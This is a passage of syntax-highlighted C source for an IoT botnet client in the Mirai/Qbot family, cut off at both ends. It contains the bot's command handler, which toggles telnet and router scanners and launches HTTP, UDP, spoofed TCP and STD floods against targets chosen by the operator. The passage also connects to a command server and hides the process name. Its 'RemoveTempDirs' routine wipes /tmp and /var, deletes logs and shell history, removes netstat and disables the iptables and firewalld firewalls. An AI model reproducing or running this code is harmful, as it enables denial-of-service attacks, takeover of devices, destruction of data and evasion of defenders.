	<span class="keyword">if</span>(argc &lt; <span class="number">2</span> || atoi(argv[<span class="number">1</span>]) == <span class="number">-1</span>)&#123;</span><br><span class="line">			sockprintf(mainCommSock, <span class="string">&quot;RANGE &lt;option 0-idk&gt;&quot;</span>);</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			sockprintf(mainCommSock, <span class="string">&quot;Mirai Range %d-&gt;%d&quot;</span>, mirairange, atoi(argv[<span class="number">1</span>]));</span><br><span class="line">			mirairange = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">			&#125; </span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;phone&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">2</span>) &#123;</span><br><span class="line"><span class="keyword">return</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;OFF&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span>(Phonepid == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">kill(Phonepid, <span class="number">9</span>);</span><br><span class="line">Phonepid = <span class="number">0</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;ON&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span>(Phonepid != <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> parent;</span><br><span class="line">parent = fork();</span><br><span class="line"><span class="keyword">if</span> (parent &gt; <span class="number">0</span>) &#123; Phonepid = parent; <span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(parent == <span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line">PhoneScanner();</span><br><span class="line">_exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">			<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;MTRANGE&quot;</span>)) &#123;</span><br><span class="line">			<span class="keyword">if</span>(argc &lt; <span class="number">2</span> || atoi(argv[<span class="number">1</span>]) == <span class="number">-1</span>)&#123;</span><br><span class="line">			sockprintf(mainCommSock, <span class="string">&quot;Mirai Test RANGE &lt;option 0-idk&gt;&quot;</span>);</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			sockprintf(mainCommSock, <span class="string">&quot;Range %d-&gt;%d&quot;</span>, miraitestrange, atoi(argv[<span class="number">1</span>]));</span><br><span class="line">			miraitestrange = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">			&#125; </span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;MIRAITEST&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">2</span>) &#123;</span><br><span class="line"><span class="keyword">return</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;OFF&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span>(testmiraiPid == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">kill(testmiraiPid, <span class="number">9</span>);</span><br><span class="line">testmiraiPid = <span class="number">0</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;ON&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span>(testmiraiPid != <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> parent;</span><br><span class="line">parent = fork();</span><br><span class="line"><span class="keyword">if</span> (parent &gt; <span class="number">0</span>) &#123; testmiraiPid = parent; <span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(parent == <span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line">MiraiHackaShit();</span><br><span class="line">_exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">			<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;TT&quot;</span>)) &#123;</span><br><span class="line">			<span class="keyword">if</span>(argc &lt; <span class="number">2</span> || atoi(argv[<span class="number">1</span>]) == <span class="number">-1</span>)&#123;</span><br><span class="line">			sockprintf(mainCommSock, <span class="string">&quot;Telnet test RANGE &lt;option 0-idk&gt;&quot;</span>);</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			sockprintf(mainCommSock, <span class="string">&quot;Range %d-&gt;%d&quot;</span>, telnettestrange, atoi(argv[<span class="number">1</span>]));</span><br><span class="line">			telnettestrange = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">			&#125; </span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;TELNETTEST&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">2</span>) &#123;</span><br><span class="line"><span class="keyword">return</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;OFF&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span>(testtelnetPid == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">kill(testtelnetPid, <span class="number">9</span>);</span><br><span class="line">testtelnetPid = <span class="number">0</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;ON&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span>(testtelnetPid != <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> parent;</span><br><span class="line">parent = fork();</span><br><span class="line"><span class="keyword">if</span> (parent &gt; <span class="number">0</span>) &#123; testtelnetPid = parent; <span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(parent == <span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line">HackaShit();</span><br><span class="line">_exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;BCM&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">2</span>) &#123;</span><br><span class="line"><span class="keyword">return</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;OFF&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span>(bcmPid == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">kill(bcmPid, <span class="number">9</span>);</span><br><span class="line">bcmPid = <span class="number">0</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;ON&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span>(bcmPid != <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> parent;</span><br><span class="line">parent = fork();</span><br><span class="line"><span class="keyword">if</span> (parent &gt; <span class="number">0</span>) &#123; bcmPid = parent; <span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(parent == <span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line">BCMscanner();</span><br><span class="line">_exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;HTTP&quot;</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// !* HTTP METHOD TARGET PORT PATH TIME POWER</span></span><br><span class="line">			<span class="comment">// !* HTTP POST/GET/HEAD hackforums.net 80 / 10 100</span></span><br><span class="line">			<span class="keyword">if</span> (argc &lt; <span class="number">6</span> || atoi(argv[<span class="number">3</span>]) &lt; <span class="number">1</span> || atoi(argv[<span class="number">5</span>]) &lt; <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">			<span class="keyword">if</span> (listFork()) <span class="keyword">return</span>;</span><br><span class="line">			SendHTTP(argv[<span class="number">1</span>], argv[<span class="number">2</span>], atoi(argv[<span class="number">3</span>]), argv[<span class="number">4</span>], atoi(argv[<span class="number">5</span>]), atoi(argv[<span class="number">6</span>]));</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;UDP&quot;</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// !* UDP TARGET PORT TIME PACKETSIZE POLLINTERVAL</span></span><br><span class="line">			<span class="keyword">if</span>(argc &lt; <span class="number">6</span> || atoi(argv[<span class="number">3</span>]) == <span class="number">-1</span> || atoi(argv[<span class="number">2</span>]) == <span class="number">-1</span> || atoi(argv[<span class="number">4</span>]) == <span class="number">-1</span> || atoi(argv[<span class="number">4</span>]) &gt; <span class="number">1024</span> || (argc == <span class="number">6</span> &amp;&amp; atoi(argv[<span class="number">5</span>]) &lt; <span class="number">1</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">char</span> *ip = argv[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">int</span> port = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">                <span class="keyword">int</span> time = atoi(argv[<span class="number">3</span>]);</span><br><span class="line">                <span class="keyword">int</span> packetsize = atoi(argv[<span class="number">4</span>]);</span><br><span class="line">                <span class="keyword">int</span> pollinterval = (argc == <span class="number">6</span> ? atoi(argv[<span class="number">5</span>]) : <span class="number">10</span>);</span><br><span class="line">				<span class="keyword">int</span> spoofed = <span class="number">32</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">strstr</span>(ip, <span class="string">&quot;,&quot;</span>) != <span class="literal">NULL</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">unsigned</span> <span class="keyword">char</span> *hi = strtok(ip, <span class="string">&quot;,&quot;</span>);</span><br><span class="line">					<span class="keyword">while</span>(hi != <span class="literal">NULL</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">if</span>(!listFork())</span><br><span class="line">						&#123;</span><br><span class="line">							SendUDP(hi, port, time, packetsize, pollinterval, spoofed);</span><br><span class="line">							_exit(<span class="number">0</span>);</span><br><span class="line">						&#125;</span><br><span class="line">						hi = strtok(<span class="literal">NULL</span>, <span class="string">&quot;,&quot;</span>);</span><br><span class="line">					&#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">							<span class="keyword">if</span> (listFork())</span><br><span class="line">							&#123;</span><br><span class="line">								<span class="keyword">return</span>;</span><br><span class="line">							&#125;</span><br><span class="line">							SendUDP(ip, port, time, packetsize, pollinterval, spoofed);</span><br><span class="line">							_exit(<span class="number">0</span>);</span><br><span class="line">					   &#125;	</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;TCP&quot;</span>))</span><br><span class="line">		&#123;</span><br><span class="line">				<span class="comment">//!* TCP TARGET PORT TIME FLAGS PACKETSIZE POLLINTERVAL</span></span><br><span class="line">                <span class="keyword">if</span>(argc &lt; <span class="number">6</span> || atoi(argv[<span class="number">3</span>]) == <span class="number">-1</span> || atoi(argv[<span class="number">2</span>]) == <span class="number">-1</span> || (argc &gt; <span class="number">5</span> &amp;&amp; atoi(argv[<span class="number">5</span>]) &lt; <span class="number">0</span>) || (argc == <span class="number">7</span> &amp;&amp; atoi(argv[<span class="number">6</span>]) &lt; <span class="number">1</span>))</span><br><span class="line">				&#123;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">				&#125;</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">char</span> *ip = argv[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">int</span> port = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">                <span class="keyword">int</span> time = atoi(argv[<span class="number">3</span>]);</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">char</span> *flags = argv[<span class="number">4</span>];</span><br><span class="line">                <span class="keyword">int</span> pollinterval = argc == <span class="number">7</span> ? atoi(argv[<span class="number">6</span>]) : <span class="number">10</span>;</span><br><span class="line">                <span class="keyword">int</span> packetsize = argc &gt; <span class="number">5</span> ? atoi(argv[<span class="number">5</span>]) : <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">int</span> spoofed = <span class="number">32</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">strstr</span>(ip, <span class="string">&quot;,&quot;</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        <span class="keyword">unsigned</span> <span class="keyword">char</span> *hi = strtok(ip, <span class="string">&quot;,&quot;</span>);</span><br><span class="line">                        <span class="keyword">while</span>(hi != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span>(!listFork()) &#123;</span><br><span class="line">                                        SendTCP(hi, port, time, flags, packetsize, pollinterval, spoofed);</span><br><span class="line">                                        _exit(<span class="number">0</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                                hi = strtok(<span class="literal">NULL</span>, <span class="string">&quot;,&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span>	&#123;</span><br><span class="line">							<span class="keyword">if</span> (listFork())</span><br><span class="line">							&#123;</span><br><span class="line">								<span class="keyword">return</span>;</span><br><span class="line">							&#125;</span><br><span class="line">							SendTCP(ip, port, time, flags, packetsize, pollinterval, spoofed);</span><br><span class="line">							_exit(<span class="number">0</span>);</span><br><span class="line">						&#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;STD&quot;</span>)) <span class="comment">//STD TARGET PORT TIME</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(argc &lt; <span class="number">4</span> || atoi(argv[<span class="number">2</span>]) &lt; <span class="number">1</span> || atoi(argv[<span class="number">3</span>]) &lt; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *ip = argv[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> port = atoi(argv[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">int</span> time = atoi(argv[<span class="number">3</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strstr</span>(ip, <span class="string">&quot;,&quot;</span>) != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *hi = strtok(ip, <span class="string">&quot;,&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(hi != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(!listFork())</span><br><span class="line">&#123;</span><br><span class="line">sendSTD(hi, port, time);</span><br><span class="line">_exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">hi = strtok(<span class="literal">NULL</span>, <span class="string">&quot;,&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (listFork()) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line">sendSTD(ip, port, time);</span><br><span class="line">_exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;stop&quot;</span>))</span><br><span class="line">		&#123;</span><br><span class="line">                <span class="keyword">int</span> killed = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">long</span> i;</span><br><span class="line">                <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; numpids; i++)</span><br><span class="line">				&#123;</span><br><span class="line">                        <span class="keyword">if</span> (pids[i] != <span class="number">0</span> &amp;&amp; pids[i] != getpid())</span><br><span class="line">						&#123;</span><br><span class="line">                                kill(pids[i], <span class="number">9</span>);</span><br><span class="line">                                killed++;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(killed &gt; <span class="number">0</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="comment">//</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">							<span class="comment">//</span></span><br><span class="line">					   &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;FUCKOFF&quot;</span>))</span><br><span class="line">		&#123;</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;UPDATE&quot;</span>))</span><br><span class="line">		&#123;</span><br><span class="line">            RemoveTempDirs();</span><br><span class="line">			sockprintf(mainCommSock, <span class="string">&quot;[Updating] [%s:%s]&quot;</span>, getBuild(), getEndianness());</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">initConnection</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> server[<span class="number">512</span>];</span><br><span class="line">	<span class="built_in">memset</span>(server, <span class="number">0</span>, <span class="number">512</span>);</span><br><span class="line">	<span class="keyword">if</span>(mainCommSock) &#123; close(mainCommSock); mainCommSock = <span class="number">0</span>; &#125;</span><br><span class="line">	<span class="keyword">if</span>(currentServer + <span class="number">1</span> == SERVER_LIST_SIZE) currentServer = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">else</span> currentServer++;</span><br><span class="line">	<span class="built_in">strcpy</span>(server, commServer[currentServer]);</span><br><span class="line">	<span class="keyword">int</span> port = <span class="number">6942</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strchr</span>(server, <span class="string">&#x27;:&#x27;</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		port = atoi(<span class="built_in">strchr</span>(server, <span class="string">&#x27;:&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">		*((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(<span class="built_in">strchr</span>(server, <span class="string">&#x27;:&#x27;</span>))) = <span class="number">0x0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	mainCommSock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(!connectTimeout(mainCommSock, server, port, <span class="number">30</span>)) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UpdateNameSrvs</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> fhandler = open(<span class="string">&quot;/etc/resolv.conf&quot;</span>, O_WRONLY | O_TRUNC);</span><br><span class="line">    <span class="keyword">if</span> (access(<span class="string">&quot;/etc/resolv.conf&quot;</span>, F_OK) != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span>* resd = <span class="string">&quot;nameserver 8.8.8.8\nnameserver 8.8.4.4\n&quot;</span>;</span><br><span class="line">        <span class="keyword">size_t</span> resl = <span class="built_in">strlen</span>(resd);</span><br><span class="line">        write(fhandler, resd, resl);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line">    close(fhandler);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RemoveTempDirs</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	system(<span class="string">&quot;rm -rf /tmp/* /var/* /var/run/* /var/tmp/*&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;rm -rf /var/log/wtmp&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;rm -rf ~/.bash_history&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;history -c;history -w&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;rm -rf /tmp/*&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;history -c&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;rm -rf /bin/netstat&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;history -w&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;pkill -9 busybox&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;pkill -9 perl&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;service iptables stop&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;/sbin/iptables -F;/sbin/iptables -X&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;service firewalld stop&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getEndianness</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">	&#123;</span></span><br><span class="line">		<span class="keyword">uint32_t</span> vlu;</span><br><span class="line">		<span class="keyword">uint8_t</span> data[<span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>)];</span><br><span class="line">	&#125; nmb;</span><br><span class="line">	nmb.data[<span class="number">0</span>] = <span class="number">0x00</span>;</span><br><span class="line">	nmb.data[<span class="number">1</span>] = <span class="number">0x01</span>;</span><br><span class="line">	nmb.data[<span class="number">2</span>] = <span class="number">0x02</span>;</span><br><span class="line">	nmb.data[<span class="number">3</span>] = <span class="number">0x03</span>;</span><br><span class="line">	<span class="keyword">switch</span> (nmb.vlu)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="function"><span class="keyword">case</span> <span class="title">UINT32_C</span><span class="params">(<span class="number">0x00010203</span>)</span>:</span></span><br><span class="line"><span class="function">			<span class="keyword">return</span> &quot;BIG_ENDIAN&quot;</span>;</span><br><span class="line">		<span class="function"><span class="keyword">case</span> <span class="title">UINT32_C</span><span class="params">(<span class="number">0x03020100</span>)</span>:</span></span><br><span class="line"><span class="function">			<span class="keyword">return</span> &quot;LITTLE_ENDIAN&quot;</span>;</span><br><span class="line">		<span class="function"><span class="keyword">case</span> <span class="title">UINT32_C</span><span class="params">(<span class="number">0x02030001</span>)</span>:</span></span><br><span class="line"><span class="function">			<span class="keyword">return</span> &quot;BIG_ENDIAN_W&quot;</span>;</span><br><span class="line">		<span class="function"><span class="keyword">case</span> <span class="title">UINT32_C</span><span class="params">(<span class="number">0x01000302</span>)</span>:</span></span><br><span class="line"><span class="function">			<span class="keyword">return</span> &quot;LITTLE_ENDIAN_W&quot;</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;UNKNOWN&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">getBuildz</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(access(<span class="string">&quot;/usr/bin/python&quot;</span>, F_OK) != <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;SERVER&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;DEVICE&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> *<span class="title">fdgets</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *buffer, <span class="keyword">int</span> bufferSize, <span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> got = <span class="number">1</span>, total = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(got == <span class="number">1</span> &amp;&amp; total &lt; bufferSize &amp;&amp; *(buffer + total - <span class="number">1</span>) != <span class="string">&#x27;\n&#x27;</span>) &#123; got = read(fd, buffer + total, <span class="number">1</span>); total++; &#125;</span><br><span class="line"><span class="keyword">return</span> got == <span class="number">0</span> ? <span class="literal">NULL</span> : buffer;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getOurIP</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> sock = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(sock == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;serv, <span class="number">0</span>, <span class="keyword">sizeof</span>(serv));</span><br><span class="line">serv.sin_family = AF_INET;</span><br><span class="line">serv.sin_addr.s_addr = inet_addr(<span class="string">&quot;8.8.8.8&quot;</span>);</span><br><span class="line">serv.sin_port = htons(<span class="number">53</span>);</span><br><span class="line"><span class="keyword">int</span> err = connect(sock, (<span class="keyword">const</span> struct sockaddr*) &amp;serv, <span class="keyword">sizeof</span>(serv));</span><br><span class="line"><span class="keyword">if</span>(err == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">name</span>;</span></span><br><span class="line"><span class="keyword">socklen_t</span> namelen = <span class="keyword">sizeof</span>(name);</span><br><span class="line">err = getsockname(sock, (struct sockaddr*) &amp;name, &amp;namelen);</span><br><span class="line"><span class="keyword">if</span>(err == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">ourIP.s_addr = name.sin_addr.s_addr;</span><br><span class="line"><span class="keyword">int</span> cmdline = open(<span class="string">&quot;/proc/net/route&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">char</span> linebuf[<span class="number">4096</span>];</span><br><span class="line"><span class="keyword">while</span>(fdgets(linebuf, <span class="number">4096</span>, cmdline) != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strstr</span>(linebuf, <span class="string">&quot;\t00000000\t&quot;</span>) != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *pos = linebuf;</span><br><span class="line"><span class="keyword">while</span>(*pos != <span class="string">&#x27;\t&#x27;</span>) pos++;</span><br><span class="line">*pos = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(linebuf, <span class="number">0</span>, <span class="number">4096</span>);</span><br><span class="line">&#125;</span><br><span class="line">close(cmdline);</span><br><span class="line"><span class="keyword">if</span>(*linebuf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ifreq</span> <span class="title">ifr</span>;</span></span><br><span class="line"><span class="built_in">strcpy</span>(ifr.ifr_name, linebuf);</span><br><span class="line">ioctl(sock, SIOCGIFHWADDR, &amp;ifr);</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++) macAddress[i] = ((<span class="keyword">unsigned</span> <span class="keyword">char</span>*)ifr.ifr_hwaddr.sa_data)[i];</span><br><span class="line">&#125;</span><br><span class="line">close(sock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">unsigned</span> <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *lolsuckmekid = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(SERVER_LIST_SIZE &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">strncpy</span>(argv[<span class="number">0</span>],<span class="string">&quot;&quot;</span>,<span class="built_in">strlen</span>(argv[<span class="number">0</span>]));</span><br><span class="line">        argv[<span class="number">0</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        